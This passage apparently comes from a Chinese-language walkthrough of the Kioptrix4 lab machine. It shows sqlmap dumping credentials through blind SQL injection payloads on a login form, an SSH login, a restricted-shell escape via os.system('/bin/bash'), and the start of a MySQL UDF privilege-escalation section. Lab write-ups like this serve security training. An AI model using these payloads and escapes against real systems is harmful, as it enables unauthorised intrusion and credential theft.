<span class="token punctuation">[</span>09:48:23<span class="token punctuation">]</span> <span class="token punctuation">[</span>INFO<span class="token punctuation">]</span> retrieved: varchar<span class="token punctuation">(</span><span class="token number">65</span><span class="token punctuation">)</span>
<span class="token punctuation">[</span>09:48:24<span class="token punctuation">]</span> <span class="token punctuation">[</span>INFO<span class="token punctuation">]</span> retrieved: password
<span class="token punctuation">[</span>09:48:24<span class="token punctuation">]</span> <span class="token punctuation">[</span>INFO<span class="token punctuation">]</span> retrieved: varchar<span class="token punctuation">(</span><span class="token number">65</span><span class="token punctuation">)</span>
Database: members
Table: members
<span class="token punctuation">[</span><span class="token number">3</span> columns<span class="token punctuation">]</span>
+----------+-------------+
<span class="token operator">|</span> Column   <span class="token operator">|</span> Type        <span class="token operator">|</span>
+----------+-------------+
<span class="token operator">|</span> <span class="token function">id</span>       <span class="token operator">|</span> int<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span>      <span class="token operator">|</span>
<span class="token operator">|</span> password <span class="token operator">|</span> varchar<span class="token punctuation">(</span><span class="token number">65</span><span class="token punctuation">)</span> <span class="token operator">|</span>
<span class="token operator">|</span> username <span class="token operator">|</span> varchar<span class="token punctuation">(</span><span class="token number">65</span><span class="token punctuation">)</span> <span class="token operator">|</span>
+----------+-------------+

<span class="token punctuation">[</span>09:48:25<span class="token punctuation">]</span> <span class="token punctuation">[</span>INFO<span class="token punctuation">]</span> fetched data logged to text files under <span class="token string">'/root/.local/share/sqlmap/output/192.168.1.6'</span>

<span class="token punctuation">[</span>*<span class="token punctuation">]</span> ending @ 09:48:25 /2024-06-12/


</code></pre> 
<blockquote> 
 <p>获得字段名</p> 
 <ul><li>id</li><li>password</li><li>username</li></ul> 
</blockquote> 
<h4><a id="316__1236"></a>3.1.6 用户名和密码</h4> 
<pre><code class="prism language-bash">┌──<span class="token punctuation">(</span>root㉿kali<span class="token punctuation">)</span>-<span class="token punctuation">[</span>/home/kali/dev_run_app/vulhub/kl_4<span class="token punctuation">]</span>
└─<span class="token comment"># sqlmap -r sql.txt --batch --level 3 -D members -T members -C id,username,password --dump</span>
        ___
       __H__
 ___ ___<span class="token punctuation">[</span><span class="token punctuation">(</span><span class="token punctuation">]</span>_____ ___ ___  <span class="token punctuation">{<!-- --></span><span class="token number">1.8</span>.3<span class="token comment">#stable}</span>
<span class="token operator">|</span>_ -<span class="token operator">|</span> <span class="token builtin class-name">.</span> <span class="token punctuation">[</span><span class="token punctuation">)</span><span class="token punctuation">]</span>     <span class="token operator">|</span> <span class="token builtin class-name">.</span><span class="token string">'| . |
|___|_  [)]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user'</span>s responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible <span class="token keyword">for</span> any misuse or damage caused by this program

<span class="token punctuation">[</span>*<span class="token punctuation">]</span> starting @ 09:52:26 /2024-06-12/

<span class="token punctuation">[</span>09:52:26<span class="token punctuation">]</span> <span class="token punctuation">[</span>INFO<span class="token punctuation">]</span> parsing HTTP request from <span class="token string">'sql.txt'</span>
<span class="token punctuation">[</span>09:52:26<span class="token punctuation">]</span> <span class="token punctuation">[</span>INFO<span class="token punctuation">]</span> resuming back-end DBMS <span class="token string">'mysql'</span> 
<span class="token punctuation">[</span>09:52:26<span class="token punctuation">]</span> <span class="token punctuation">[</span>INFO<span class="token punctuation">]</span> testing connection to the target URL
sqlmap resumed the following injection point<span class="token punctuation">(</span>s<span class="token punctuation">)</span> from stored session:
---
Parameter: mypassword <span class="token punctuation">(</span>POST<span class="token punctuation">)</span>
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause <span class="token punctuation">(</span>subquery - comment<span class="token punctuation">)</span>
    Payload: <span class="token assign-left variable">myusername</span><span class="token operator">=</span>admin<span class="token operator">&amp;</span><span class="token assign-left variable">mypassword</span><span class="token operator">=</span><span class="token number">123456</span><span class="token string">' AND 5147=(SELECT (CASE WHEN (5147=5147) THEN 5147 ELSE (SELECT 3625 UNION SELECT 8434) END))-- -&amp;Submit=Login

    Type: time-based blind
    Title: MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP)
    Payload: myusername=admin&amp;mypassword=123456'</span> AND <span class="token punctuation">(</span>SELECT <span class="token number">1417</span> FROM <span class="token punctuation">(</span>SELECT<span class="token punctuation">(</span>SLEEP<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">))</span><span class="token punctuation">)</span>ImmZ<span class="token punctuation">)</span>-- MSgA<span class="token operator">&amp;</span><span class="token assign-left variable">Submit</span><span class="token operator">=</span>Login
---
<span class="token punctuation">[</span>09:52:26<span class="token punctuation">]</span> <span class="token punctuation">[</span>INFO<span class="token punctuation">]</span> the back-end DBMS is MySQL
web server operating system: Linux Ubuntu <span class="token number">8.04</span> <span class="token punctuation">(</span>Hardy Heron<span class="token punctuation">)</span>
web application technology: Apache <span class="token number">2.2</span>.8, PHP <span class="token number">5.2</span>.4
back-end DBMS: MySQL <span class="token operator">&gt;=</span> <span class="token number">5.0</span>.12
<span class="token punctuation">[</span>09:52:26<span class="token punctuation">]</span> <span class="token punctuation">[</span>INFO<span class="token punctuation">]</span> fetching entries of column<span class="token punctuation">(</span>s<span class="token punctuation">)</span> <span class="token string">'id,password,username'</span> <span class="token keyword">for</span> table <span class="token string">'members'</span> <span class="token keyword">in</span> database <span class="token string">'members'</span>
<span class="token punctuation">[</span>09:52:26<span class="token punctuation">]</span> <span class="token punctuation">[</span>INFO<span class="token punctuation">]</span> fetching number of column<span class="token punctuation">(</span>s<span class="token punctuation">)</span> <span class="token string">'id,password,username'</span> entries <span class="token keyword">for</span> table <span class="token string">'members'</span> <span class="token keyword">in</span> database <span class="token string">'members'</span>
<span class="token punctuation">[</span>09:52:26<span class="token punctuation">]</span> <span class="token punctuation">[</span>WARNING<span class="token punctuation">]</span> running <span class="token keyword">in</span> a single-thread mode. Please consider usage of option <span class="token string">'--threads'</span> <span class="token keyword">for</span> faster data retrieval
<span class="token punctuation">[</span>09:52:26<span class="token punctuation">]</span> <span class="token punctuation">[</span>INFO<span class="token punctuation">]</span> retrieved: <span class="token number">2</span>
<span class="token punctuation">[</span>09:52:26<span class="token punctuation">]</span> <span class="token punctuation">[</span>INFO<span class="token punctuation">]</span> retrieved: <span class="token number">1</span>
<span class="token punctuation">[</span>09:52:26<span class="token punctuation">]</span> <span class="token punctuation">[</span>INFO<span class="token punctuation">]</span> retrieved: MyNameIsJohn
<span class="token punctuation">[</span>09:52:27<span class="token punctuation">]</span> <span class="token punctuation">[</span>INFO<span class="token punctuation">]</span> retrieved: john
<span class="token punctuation">[</span>09:52:27<span class="token punctuation">]</span> <span class="token punctuation">[</span>INFO<span class="token punctuation">]</span> retrieved: <span class="token number">2</span>
<span class="token punctuation">[</span>09:52:27<span class="token punctuation">]</span> <span class="token punctuation">[</span>INFO<span class="token punctuation">]</span> retrieved: ADGAds
<span class="token punctuation">[</span>09:52:28<span class="token punctuation">]</span> <span class="token punctuation">[</span>INFO<span class="token punctuation">]</span> retrieved: 
<span class="token punctuation">[</span>09:52:28<span class="token punctuation">]</span> <span class="token punctuation">[</span>WARNING<span class="token punctuation">]</span> <span class="token punctuation">(</span>case<span class="token punctuation">)</span> time-based comparison requires reset of statistical model, please wait<span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span> <span class="token punctuation">(</span>done<span class="token punctuation">)</span>                                                                        
<span class="token keyword">do</span> you want sqlmap to try to optimize value<span class="token punctuation">(</span>s<span class="token punctuation">)</span> <span class="token keyword">for</span> DBMS delay responses <span class="token punctuation">(</span>option <span class="token string">'--time-sec'</span><span class="token punctuation">)</span>? <span class="token punctuation">[</span>Y/n<span class="token punctuation">]</span> Y
<span class="token punctuation">[</span>09:52:33<span class="token punctuation">]</span> <span class="token punctuation">[</span>WARNING<span class="token punctuation">]</span> it is very important to not stress the network connection during usage of time-based payloads to prevent potential disruptions 
<span class="token punctuation">[</span>09:52:43<span class="token punctuation">]</span> <span class="token punctuation">[</span>INFO<span class="token punctuation">]</span> adjusting <span class="token function">time</span> delay to <span class="token number">1</span> second due to good response <span class="token builtin class-name">times</span>
robert
Database: members
Table: members
<span class="token punctuation">[</span><span class="token number">2</span> entries<span class="token punctuation">]</span>
+----+----------+--------------+
<span class="token operator">|</span> <span class="token function">id</span> <span class="token operator">|</span> username <span class="token operator">|</span> password     <span class="token operator">|</span>
+----+----------+--------------+
<span class="token operator">|</span> <span class="token number">1</span>  <span class="token operator">|</span> john     <span class="token operator">|</span> MyNameIsJohn <span class="token operator">|</span>
<span class="token operator">|</span> <span class="token number">2</span>  <span class="token operator">|</span> robert   <span class="token operator">|</span> ADGAds       <span class="token operator">|</span>
+----+----------+--------------+

</code></pre> 
<blockquote> 
 <p>获得用户名和密码</p> 
</blockquote> 
<table><thead><tr><th>用户名</th><th>密码</th></tr></thead><tbody><tr><td>john</td><td>MyNameIsJohn</td></tr><tr><td>robert</td><td>ADGAds</td></tr></tbody></table> 
<h3><a id="32_shell_1304"></a>3.2 shell逃逸</h3> 
<h4><a id="321_ssh_1305"></a>3.2.1 ssh登录</h4> 
<pre><code class="prism language-bash">Xshell <span class="token number">7</span> <span class="token punctuation">(</span>Build 0063<span class="token punctuation">)</span>
Copyright <span class="token punctuation">(</span>c<span class="token punctuation">)</span> <span class="token number">2020</span> NetSarang Computer, Inc. All rights reserved.

Type `help<span class="token string">' to learn how to use Xshell prompt.
[C:\~]$ ssh john@192.168.1.6


Connecting to 192.168.1.6:22...
Connection established.
To escape to local shell, press '</span>Ctrl+Alt+<span class="token punctuation">]</span><span class="token string">'.

WARNING! The remote SSH server rejected X11 forwarding request.
Welcome to LigGoat Security Systems - We are Watching
== Welcome LigGoat Employee ==
LigGoat Shell is in place so you  don'</span>t screw up
Type <span class="token string">'?'</span> or <span class="token string">'help'</span> to get the list of allowed commands
john:~$ 

</code></pre> 
<p>登录shell成功</p> 
<h4><a id="322_shell_1328"></a>3.2.2 shell逃逸</h4> 
<pre><code class="prism language-bash">Xshell <span class="token number">7</span> <span class="token punctuation">(</span>Build 0063<span class="token punctuation">)</span>
Copyright <span class="token punctuation">(</span>c<span class="token punctuation">)</span> <span class="token number">2020</span> NetSarang Computer, Inc. All rights reserved.

Type `help<span class="token string">' to learn how to use Xshell prompt.
[C:\~]$ ssh john@192.168.1.6


Connecting to 192.168.1.6:22...
Connection established.
To escape to local shell, press '</span>Ctrl+Alt+<span class="token punctuation">]</span><span class="token string">'.

WARNING! The remote SSH server rejected X11 forwarding request.
Welcome to LigGoat Security Systems - We are Watching
== Welcome LigGoat Employee ==
LigGoat Shell is in place so you  don'</span>t screw up
Type <span class="token string">'?'</span> or <span class="token string">'help'</span> to get the list of allowed commands
john:~$ <span class="token builtin class-name">echo</span> os.system<span class="token punctuation">(</span><span class="token string">'/bin/bash'</span><span class="token punctuation">)</span>
john@Kioptrix4:~$ 

</code></pre> 
<blockquote> 
 <p>逃逸受限的shell成功。</p> 
</blockquote> 
<h3><a id="33_mysql_udf_1354"></a>3.3 mysql udf提权</h3> 
<h4><a id="331__1355"></a>3.3.1 查看服务</h4> 
<pre><code class="prism language-bash">john@Kioptrix4:~$ <span class="token function">ps</span> <span class="token parameter variable">-ef</span>
<span class="token environment constant">UID</span>        PID  <span class="token environment constant">PPID</span>  C STIME TTY          TIME CMD
root         <span class="token number">1</span>     <span class="token number">0</span>  <span class="token number">0</span> <span class="token number">16</span>:22 ?        00:00:03 /sbin/init
root         <span class="token number">2</span>     <span class="token number">0</span>  <span class="token number">0</span> <span class="token number">16</span>:22 ?        00:00:00 <span class="token punctuation">[</span>kthreadd<span class="token punctuation">]</span>
root         <span class="token number">3</span>     <span class="token number">2</span>  <span class="token number">0</span> <span class="token number">16</span>:22 ?        00:00:00 <span class="token punctuation">[</span>migration/0<span class="token punctuation">]</span>
root         <span class="token number">4</span>     <span class="token number">2</span>  <span class="token number">0</span> <span class="token number">16</span>:22 ?        00:00:00 <span class="token punctuation">[</span>ksoftirqd/0<span class="token punctuation">]</span>
root         <span class="token number">5</span>     <span class="token number">2</span>  <span class="token number">0</span> <span class="token number">16</span>:22 ?        00:00:00 <span class="token punctuation">[</span>watchdog/0<span class="token punctuation">]</span>
root         <span class="token number">6</span>     <span class="token number">2</span>  <span class="token number">0</span> <span class="token number">16</span>:22 ?        00:00:00 <span class="token punctuation">[</span>migration/1<span class="token punctuation">]</span>
root         <span class="token number">7</span>     <span class="token number">2</span>  <span class="token number">0</span> <span class="token number">16</span>:22 ?        00:00:00 <span class="token punctuation">[</span>ksoftirqd/1<span class="token punctuation">]</span>
root         <span class="token number">8</span>     <span class="token number">2</span>  <span class="token number">0</span> <span class="token number">16</span>:22 ?        00:00:00 <span class="token punctuation">[</span>watchdog/1<span class="token punctuation">]</span>
root         <span class="token number">9</span>     <span class="token number">2</span>  <span class="token number">0</span> <span class="token number">16</span>:22 ?        00:00:00 <span class="token punctuation">[</span>events/0<span class="token punctuation">]</span>
root        <span class="token number">10</span>     <span class="token number">2</span>  <span class="token number">0</span> <span class="token number">16</span>:22 ?        00:00:00 <span class="token punctuation">[</span>events/1<span class="token punctuation">]</span>
root        <span class="token number">11</span>     <span class="token number">2</span>  <span class="token number">0</span> <span class="token number">16</span>:22 ?        00:00:00 <span class="token punctuation">[</span>khelper<span class="token punctuation">]</span>
root        <span class="token number">46</span>     <span class="token number">2</span>  <span class="token number">0</span> <span class="token number">16</span>:22 ?        00:00:00 <span class="token punctuation">[</span>kblockd/0<span class="token punctuation">]</span>
root        <span class="token number">47</span>     <span class="token number">2</span>  <span class="token number">0</span> <span class="token number">16</span>:22 ?        00:00:00 <span class="token punctuation">[</span>kblockd/1<span class="token punctuation">]</span>
root        <span class="token number">50</span>     <span class="token number">2</span>  <span class="token number">0</span> <span class="token number">16</span>:22 ?        00:00:00 <span class="token punctuation">[</span>kacpid<span class="token punctuation">]</span>
root        <span class="token number">51</span>     <span class="token number">2</span>  <span class="token number">0</span> <span class="token number">16</span>:22 ?        00:00:00 <span class="token punctuation">[</span>kacpi_notify<span class="token punctuation">]</span>
root       <span class="token number">247</span>     <span class="token number">2</span>  <span class="token number">0</span> <span class="token number">16</span>:22 ?        00:00:00 <span class="token punctuation">[</span>kseriod<span class="token punctuation">]</span>
root       <span class="token number">291</span>     <span class="token number">2</span>  <span class="token number">0</span> <span class="token number">16</span>:22 ?        00:00:00 <span class="token punctuation">[</span>pdflush<span class="token punctuation">]</span>
root       <span class="token number">292</span>     <span class="token number">2</span>  <span class="token number">0</span> <span class="token number">16</span>:22 ?        00:00:00 <span class="token punctuation">[</span>pdflush<span class="token punctuation">]</span>
root       <span class="token number">293</span>     <span class="token number">2</span>  <span class="token number">0</span> <span class="token number">16</span>:22 ?        00:00:00 <span class="token punctuation">[</span>kswapd0<span class="token punctuation">]</span>
root       <span class="token number">335</span>     <span class="token number">2</span>  <span class="token number">0</span> <span class="token number">16</span>:22 ?        00:00:00 <span class="token punctuation">[</span>aio/0<span class="token punctuation">]</span>
root       <span class="token number">336</span>     <span class="token number">2</span>  <span class="token number">0</span> <span class="token number">16</span>:22 ?        00:00:00 <span class="token punctuation">[</span>aio/1<span class="token punctuation">]</span>
root      <span class="token number">1742</span>     <span class="token number">2</span>  <span class="token number">0</span> <span class="token number">16</span>:22 ?        00:00:00 <span class="token punctuation">[</span>ksuspend_usbd<span class="token punctuation">]</span>
root      <span class="token number">1746</span>     <span class="token number">2</span>  <span class="token number">0</span> <span class="token number">16</span>:22 ?        00:00:00 <span class="token punctuation">[</span>khubd<span class="token punctuation">]</span>
root      <span class="token number">2180</span>     <span class="token number">2</span>  <span class="token number">0</span> <span class="token number">16</span>:22 ?        00:00:00 <span class="token punctuation">[</span>ata/0<span class="token punctuation">]</span>
root      <span class="token number">2181</span>     <span class="token number">2</span>  <span class="token number">0</span> <span class="token number">16</span>:22 ?        00:00:00 <span class="token punctuation">[</span>ata/1<span class="token punctuation">]</span>
root      <span class="token number">2185</span>     <span class="token number">2</span>  <span class="token number">0</span> <span class="token number">16</span>:22 ?        00:00:00 <span class="token punctuation">[</span>ata_aux<span class="token punctuation">]</span>
root      <span class="token number">2629</span>     <span class="token number">2</span>  <span class="token number">0</span> <span class="token number">16</span>:22 ?        00:00:00 <span class="token punctuation">[</span>scsi_eh_0<span class="token punctuation">]</span>
root      <span class="token number">2657</span>     <span class="token number">2</span>  <span class="token number">0</span> <span class="token number">16</span>:22 ?        00:00:00 <span class="token punctuation">[</span>scsi_eh_1<span class="token punctuation">]</span>
root      <span class="token number">2658</span>     <span class="token number">2</span>  <span class="token number">0</span> <span class="token number">16</span>:22 ?        00:00:00 <span class="token punctuation">[</span>scsi_eh_2<span class="token punctuation">]</span>
root      <span class="token number">2659</span>     <span class="token number">2</span>  <span class="token number">0</span> <span class="token number">16</span>:22 ?        00:00:00 <span class="token punctuation">[</span>scsi_eh_3<span class="token punctuation">]</span>
root      <span class="token number">2660</span>     <span class="token number">2</span>  <span class="token number">0</span> <span class="token number">16</span>:22 ?        00:00:00 <span class="token punctuation">[</span>scsi_eh_4<span class="token punctuation">]</span>
root      <span class="token number">2661</span>     <span class="token number">2</span>  <span class="token number">0</span> <span class="token number">16</span>:22 ?        00:00:00 <span class="token punctuation">[</span>scsi_eh_5<span class="token punctuation">]</span>
root      <span class="token number">2662</span>     <span class="token number">2</span>  <span class="token number">0</span> <span class="token number">16</span>:22 ?        00:00:00 <span class="token punctuation">[</span>scsi_eh_6<span class="token punctuation">]</span>
root      <span class="token number">2663</span>     <span class="token number">2</span>  <span class="token number">0</span> <span class="token number">16</span>:22 ?        00:00:00 <span class="token punctuation">[</span>scsi_eh_7<span class="token punctuation">]</span>
root      <span class="token number">2664</span>     <span class="token number">2</span>  <span class="token number">0</span> <span class="token number">16</span>:22 ?        00:00:00 <span class="token punctuation">[</span>scsi_eh_8<span class="token punctuation">]</span>
root      <span class="token number">2665</span>     <span class="token number">2</span>  <span class="token number">0</span> <span class="token number">16</span>:22 ?        00:00:00 <span class="token punctuation">[</span>scsi_eh_9<span class="token punctuation">]</span>
root      <span class="token number">2666</span>     <span class="token number">2</span>  <span class="token number">0</span> <span class="token number">16</span>:22 ?        00:00:00 <span class="token punctuation">[</span>scsi_eh_10<span class="token punctuation">]</span>
root      <span class="token number">2667</span>     <span class="token number">2</span>  <span class="token number">0</span> <span class="token number">16</span>:22 ?        00:00:00 <span class="token punctuation">[</span>scsi_eh_11<span class="token punctuation">]</span>
root      <span class="token number">2668</span>     <span class="token number">2</span>  <span class="token number">0</span> <span class="token number">16</span>:22 ?        00:00:00 <span class="token punctuation">[</span>scsi_eh_12<span class="token punctuation">]</span>
root      <span class="token number">2669</span>     <span class="token number">2</span>  <span class="token number">0</span> <span class="token number">16</span>:22 ?        00:00:00 <span class="token punctuation">[</span>scsi_eh_13<span class="token punctuation">]</span>
root      <span class="token number">2670</span>     <span class="token number">2</span>  <span class="token number">0</span> <span class="token number">16</span>:22 ?        00:00:00 <span class="token punctuation">[</span>scsi_eh_14<span class="token punctuation">]</span>
root      <span class="token number">2671</span>     <span class="token number">2</span>  <span class="token number">0</span> <span class="token number">16</span>:22 ?        00:00:00 <span class="token punctuation">[</span>scsi_eh_15<span class="token punctuation">]</span>
root      <span class="token number">2672</span>     <span class="token number">2</span>  <span class="token number">0</span> <span class="token number">16</span>:22 ?        00:00:00 <span class="token punctuation">[</span>scsi_eh_16<span class="token punctuation">]</span>
root      <span class="token number">2673</span>     <span class="token number">2</span>  <span class="token number">0</span> <span class="token number">16</span>:22 ?        00:00:00 <span class="token punctuation">[</span>scsi_eh_17<span class="token punctuation">]</span>
root      <span class="token number">2674</span>     <span class="token number">2</span>  <span class="token number">0</span> <span class="token number">16</span>:22 ?        00:00:00 <span class="token punctuation">[</span>scsi_eh_18<span class="token punctuation">]</span>
root      <span class="token number">2675</span>     <span class="token number">2</span>  <span class="token number">0</span> <span class="token number">16</span>:22 ?        00:00:00 <span class="token punctuation">[</span>scsi_eh_19<span class="token punctuation">]</span>
root      <span class="token number">2676</span>     <span class="token number">2</span>  <span class="token number">0</span> <span class="token number">16</span>:22 ?        00:00:00 <span class="token punctuation">[</span>scsi_eh_20<span class="token punctuation">]</span>
root      <span class="token number">2677</span>     <span class="token number">2</span>  <span class="token number">0</span> <span class="token number">16</span>:22 ?        00:00:00 <span class="token punctuation">[</span>scsi_eh_21<span class="token punctuation">]</span>
root      <span class="token number">2678</span>     <span class="token number">2</span>  <span class="token number">0</span> <span class="token number">16</span>:22 ?        00:00:00 <span class="token punctuation">[</span>scsi_eh_22<span class="token punctuation">]</span>
root      <span class="token number">2679</span>     <span class="token number">2</span>  <span class="token number">0</span> <span class="token number">16</span>:22 ?        00:00:00 <span class="token punctuation">[</span>scsi_eh_23<span class="token punctuation">]</span>
root      <span class="token number">2680</span>     <span class="token number">2</span>  <span class="token number">0</span> <span class="token number">16</span>:22 ?        00:00:00 <span class="token punctuation">[</span>scsi_eh_24<span class="token punctuation">]</span>
root      <span class="token number">2681</span>     <span class="token number">2</span>  <span class="token number">0</span> <span class="token number">16</span>:22 ?        00:00:00 <span class="token punctuation">[</span>scsi_eh_25<span class="token punctuation">]</span>
root      <span class="token number">2682</span>     <span class="token number">2</span>  <span class="token number">0</span> <span class="token number">16</span>:22 ?        00:00:00 <span class="token punctuation">[</span>scsi_eh_26<span class="token punctuation">]</span>
root      <span class="token number">2683</span>     <span class="token number">2</span>  <span class="token number">0</span> <span class="token number">16</span>:22 ?        00:00:00 <span class="token punctuation">[</span>scsi_eh_27<span class="token punctuation">]</span>
root      <span class="token number">2684</span>     <span class="token number">2</span>  <span class="token number">0</span> <span class="token number">16</span>:22 ?        00:00:00 <span class="token punctuation">[</span>scsi_eh_28<span class="token punctuation">]</span>
root      <span class="token number">2685</span>     <span class="token number">2</span>  <span class="token number">0</span> <span class="token number">16</span>:22 ?        00:00:00 <span class="token punctuation">[</span>scsi_eh_29<span class="token punctuation">]</span>
root      <span class="token number">2686</span>     <span class="token number">2</span>  <span class="token number">0</span> <span class="token number">16</span>:22 ?        00:00:00 <span class="token punctuation">[</span>scsi_eh_30<span class="token punctuation">]</span>
root      <span class="token number">2990</span>     <span class="token number">2</span>  <span class="token number">0</span> <span class="token number">16</span>:22 ?        00:00:00 <span class="token punctuation">[</span>scsi_eh_31<span class="token punctuation">]</span>
root      <span class="token number">2992</span>     <span class="token number">2</span>  <span class="token number">0</span> <span class="token number">16</span>:22 ?        00:00:00 <span class="token punctuation">[</span>scsi_eh_32<span class="token punctuation">]</span>
root      <span class="token number">3287</span>     <span class="token number">2</span>  <span class="token number">0</span> <span class="token number">16</span>:22 ?        00:00:00 <span class="token punctuation">[</span>kjournald<span class="token punctuation">]</span>
root      <span class="token number">3458</span>     <span class="token number">1</span>  <span class="token number">0</span> <span class="token number">16</span>:22 ?        00:00:00 /sbin/udevd <span class="token parameter variable">--daemon</span>
root      <span class="token number">3805</span>     <span class="token number">2</span>  <span class="token number">0</span> <span class="token number">16</span>:22 ?        00:00:00 <span class="token punctuation">[</span>kgameportd<span class="token punctuation">]</span>
root      <span class="token number">4103</span>     <span class="token number">2</span>  <span class="token number">0</span> <span class="token number">16</span>:22 ?        00:00:00 <span class="token punctuation">[</span>kpsmoused<span class="token punctuation">]</span>
root      <span class="token number">5400</span>     <span class="token number">1</span>  <span class="token number">0</span> <span class="token number">16</span>:22 tty4     00:00:00 /sbin/getty <span class="token number">38400</span> tty4
root      <span class="token number">5401</span>     <span class="token number">1</span>  <span class="token number">0</span> <span class="token number">16</span>:22 tty5     00:00:00 /sbin/getty <span class="token number">38400</span> tty5
root      <span class="token number">5408</span>     <span class="token number">1</span>  <span class="token number">0</span> <span class="token number">16</span>:22 tty2     00:00:00 /sbin/getty <span class="token number">38400</span> tty2
root      <span class="token number">5410</span>     <span class="token number">1</span>  <span class="token number">0</span> <span class="token number">16</span>:22 tty3     00:00:00 /sbin/getty <span class="token number">38400</span> tty3
root      <span class="token number">5413</span>     <span class="token number">1</span>  <span class="token number">0</span> <span class="token number">16</span>:22 tty6     00:00:00 /sbin/getty <span class="token number">38400</span> tty6
syslog    <span class="token number">5449</span>     <span class="token number">1</span>  <span class="token number">0</span> <span class="token number">16</span>:22 ?        00:00:00 /sbin/syslogd <span class="token parameter variable">-u</span> syslog
root      <span class="token number">5468</span>     <span class="token number">1</span>  <span class="token number">0</span> <span class="token number">16</span>:22 ?        00:00:00 /bin/dd bs <span class="token number">1</span> <span class="token keyword">if</span> /proc/kmsg of /var/run/klogd/kmsg
klog      <span class="token number">5470</span>     <span class="token number">1</span>  <span class="token number">0</span> <span class="token number">16</span>:22 ?        00:00:00 /sbin/klogd <span class="token parameter variable">-P</span> /var/run/klogd/kmsg
root      <span class="token number">5489</span>     <span class="token number">1</span>  <span class="token number">0</span> <span class="token number">16</span>:22 ?        00:00:00 /usr/sbin/sshd
root      <span class="token number">5545</span>     <span class="token number">1</span>  <span class="token number">0</span> <span class="token number">16</span>:22 ?        00:00:00 /bin/sh /usr/bin/mysqld_safe
root      <span class="token number">5587</span>  <span class="token number">5545</span>  <span class="token number">0</span> <span class="token number">16</span>:22 ?        00:00:04 /usr/sbin/mysqld <span class="token parameter variable">--basedir</span><span class="token operator">=</span>/usr <span class="token parameter variable">--datadir</span><span class="token operator">=</span>/var/lib/mysql <span class="token parameter variable">--user</span><span class="token operator">=</span>root --pid-file<span class="token operator">=</span>/var/run/mysqld/mysqld.pid --skip-external-locking <span class="token parameter variable">--port</span><span class="token operator">=</span><span class="token number">3306</span> <span class="token parameter variable">--socket</span><span class="token operator">=</span>/var/run/mysqld/mysqld.sock
root      <span class="token number">5588</span>  <span class="token number">5545</span>  <span class="token number">0</span> <span class="token number">16</span>:22 ?        00:00:00 logger <span class="token parameter variable">-p</span> daemon.err <span class="token parameter variable">-t</span> mysqld_safe <span class="token parameter variable">-i</span> <span class="token parameter variable">-t</span> mysqld
root      <span class="token number">5662</span>     <span class="token number">1</span>  <span class="token number">0</span> <span class="token number">16</span>:22 ?        00:00:00 /usr/sbin/nmbd <span class="token parameter variable">-D</span>
root      <span class="token number">5664</span>     <span class="token number">1</span>  <span class="token number">0</span> <span class="token number">16</span>:22 ?        00:00:00 /usr/sbin/smbd <span class="token parameter variable">-D</span>
root      <span class="token number">5678</span>  <span class="token number">5664</span>  <span class="token number">0</span> <span class="token number">16</span>:22 ?        00:00:00 /usr/sbin/smbd <span class="token parameter variable">-D</span>
root      <span class="token number">5679</span>     <span class="token number">1</span>  <span class="token number">0</span> <span class="token number">16</span>:22 ?        00:00:00 /usr/sbin/winbindd
root      <span class="token number">5683</span>  <span class="token number">5679</span>  <span class="token number">0</span> <span class="token number">16</span>:22 ?        00:00:00 /usr/sbin/winbindd
daemon    <span class="token number">5700</span>     <span class="token number">1</span>  <span class="token number">0</span> <span class="token number">16</span>:22 ?        00:00:00 /usr/sbin/atd
root      <span class="token number">5711</span>     <span class="token number">1</span>  <span class="token number">0</span> <span class="token number">16</span>:22 ?        00:00:00 /usr/sbin/cron
root      <span class="token number">5733</span>     <span class="token number">1</span>  <span class="token number">0</span> <span class="token number">16</span>:22 ?        00:00:00 /usr/sbin/apache2 <span class="token parameter variable">-k</span> start
dhcp      <span class="token number">5783</span>     <span class="token number">1</span>  <span class="token number">0</span> <span class="token number">16</span>:22 ?        00:00:00 dhclient eth1
root      <span class="token number">5790</span>     <span class="token number">1</span>  <span class="token number">0</span> <span class="token number">16</span>:22 tty1     00:00:00 /sbin/getty <span class="token number">38400</span> tty1
root      <span class="token number">5806</span>  <span class="token number">5679</span>  <span class="token number">0</span> <span class="token number">16</span>:34 ?        00:00:00 /usr/sbin/winbindd
root      <span class="token number">5807</span>  <span class="token number">5679</span>  <span class="token number">0</span> <span class="token number">16</span>:34 ?        00:00:00 /usr/sbin/winbindd
www-data  <span class="token number">6714</span>  <span class="token number">5733</span>  <span class="token number">0</span> <span class="token number">17</span>:21 ?        00:00:00 /usr/sbin/apache2 <span class="token parameter variable">-k</span> start
www-data  <span class="token number">6715</span>  <span class="token number">5733</span>  <span class="token number">0</span> <span class="token number">17</span>:21 ?        00:00:00 /usr/sbin/apache2 <span class="token parameter variable">-k</span> start
www-data  <span class="token number">6716</span>  <span class="token number">5733</span>  <span class="token number">0</span> <span class="token number">17</span>:21 ?        00:00:00 /usr/sbin/apache2 <span class="token parameter variable">-k</span> start
www-data  <span class="token number">6717</span>  <span class="token number">5733</span>  <span class="token number">0</span> <span class="token number">17</span>:21 ?        00:00:00 /usr/sbin/apache2 <span class="token parameter variable">-k</span> start
www-data  <span class="token number">6718</span>  <span class="token number">5733</span>  <span class="token number">0</span> <span class="token number">17</span>:21 ?        00:00:00 /usr/sbin/apache2 <span class="token parameter variable">-k</span> start
www-data  <span class="token number">6719</span>  <span class="token number">5733</span>  <span class="token number">0</span> <span class="token number">17</span>:21 ?        00:00:00 /usr/sbin/apache2 <span class="token parameter variable">-k</span> start
www-data  <span class="token number">6720</span>  <span class="token number">5733</span>  <span class="token number">0</span> <span class="token number">17</span>:21 ?        00:00:00 /usr/sbin/apache2 <span class="token parameter variable">-k</span> start
